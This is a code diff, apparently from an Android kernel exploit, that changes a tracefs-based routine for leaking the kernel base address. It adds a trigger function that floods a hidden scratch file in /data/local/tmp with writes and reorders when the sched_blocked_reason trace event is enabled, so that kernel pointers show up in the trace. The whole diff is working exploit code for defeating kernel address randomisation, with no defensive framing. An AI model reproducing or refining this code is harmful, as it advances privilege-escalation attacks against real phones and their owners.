@@ -74,6 +74,55 @@ static int slide_tracefs_parse_page(
   return 0;
 }
 
+static int slide_tracefs_trigger(void) {
+  char path[96];
+  snprintf(path, sizeof(path), "/data/local/tmp/.s23-trace-io-%d", getpid());
+  int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0600);
+  if (fd < 0) {
+    pr_error("slide tracefs trigger open failed errno=%d\n", errno);
+    return 0;
+  }
+  size_t chunk_size = 0x40000;
+  unsigned char *chunk = calloc(1, chunk_size);
+  if (!chunk) {
+    int saved_errno = errno;
+    close(fd);
+    unlink(path);
+    errno = saved_errno;
+    pr_error("slide tracefs trigger alloc failed errno=%d\n", errno);
+    return 0;
+  }
+  int ok = 1;
+  for (int round = 0; round < 16 && ok; round++) {
+    size_t done = 0;
+    while (done < chunk_size) {
+      ssize_t wrote = write(fd, chunk + done, chunk_size - done);
+      if (wrote < 0 && errno == EINTR) {
+        continue;
+      }
+      if (wrote <= 0) {
+        ok = 0;
+        break;
+      }
+      done += (size_t)wrote;
+    }
+  }
+  free(chunk);
+  if (ok && fsync(fd) != 0) {
+    ok = 0;
+  }
+  int saved_errno = errno;
+  close(fd);
+  unlink(path);
+  errno = saved_errno;
+  if (!ok) {
+    pr_error("slide tracefs trigger write failed errno=%d\n", errno);
+    return 0;
+  }
+  pr_info("slide tracefs trigger bytes=%u\n", 16U * 0x40000U);
+  return 1;
+}
+
 static int slide_tracefs_leak_kernel_base(void) {
   static const char tracing_on[] =
       SLIDE_TRACEFS_ROOT "/tracing_on";
@@ -82,9 +131,7 @@ static int slide_tracefs_leak_kernel_base(void) {
   static const char event_enable[] =
       SLIDE_TRACEFS_ROOT "/events/sched/sched_blocked_reason/enable";
 
-  if (!slide_tracefs_write(tracing_on, "0") ||
-      !slide_tracefs_write(event_enable, "1") ||
-      !slide_tracefs_write(tracing_on, "1")) {
+  if (!slide_tracefs_write(tracing_on, "0")) {
     pr_error("slide tracefs setup failed errno=%d\n", errno);
     return 0;
   }
@@ -92,6 +139,16 @@ static int slide_tracefs_leak_kernel_base(void) {
   int trace_fd = open(trace, O_WRONLY | O_TRUNC | O_CLOEXEC);
   if (trace_fd >= 0) {
     close(trace_fd);
+  }
+  if (!slide_tracefs_write(event_enable, "1") ||
+      !slide_tracefs_write(tracing_on, "1")) {
+    pr_error("slide tracefs setup failed errno=%d\n", errno);
+    return 0;
+  }
+  if (!slide_tracefs_trigger()) {
+    slide_tracefs_write(tracing_on, "0");
+    slide_tracefs_write(event_enable, "0");
+    return 0;
   }
   sleep(1);
   slide_tracefs_write(tracing_on, "0");
